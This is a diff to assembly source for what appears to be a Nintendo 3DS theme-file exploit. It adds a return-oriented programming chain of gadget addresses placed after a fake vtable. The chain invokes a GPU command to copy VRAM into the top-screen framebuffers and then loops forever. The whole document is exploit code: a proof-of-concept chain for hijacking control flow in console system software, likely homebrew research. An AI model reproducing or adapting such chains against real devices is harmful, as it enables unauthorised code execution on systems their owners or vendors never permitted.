@@ -96,6 +96,8 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #define GXLOW_CMD4 0x0014d604
 #endif
 
+#define ROP_BXR1 POP_R4LR_BXR1+4
+
 _start:
 
 themeheader:
@@ -132,5 +134,38 @@ vtable:
 .space ((vtable + 0x100) - .)
 
 ropstackstart:
+.word POP_R1PC
+.word ROP_POPPC @ r1
+
+.word POP_R4LR_BXR1
+.word 0 @ r4
+.word POP_R2R6PC @ lr
+
+.word POP_R0PC
+.word 0x1f000000 @ r0, src (VRAM+0)
+
+.word POP_R1PC
+.word 0x1f1e6000 @ r1, dst (top-screen framebuffers in VRAM)
+
+.word POP_R2R6PC
+.word 0x46800*2 @ r2, size
+.word 0 @ r3, width0
+.word 0 @ r4
+.word 0 @ r5
+.word 0 @ r6
+
+.word GXLOW_CMD4
+
+.word 0 @ r2 / sp0 (height0)
+.word 0 @ r3 / sp4 (width1)
+.word 0 @ r4 / sp8 (height1)
+.word 0x8 @ r5 / sp12 (flags)
+.word 0 @ r6
+
+.word POP_R1PC
+.word ROP_BXR1 @ r1
+
+.word ROP_BXR1 @ This is used as an infinite loop.
+
 .word 0x58584148
 
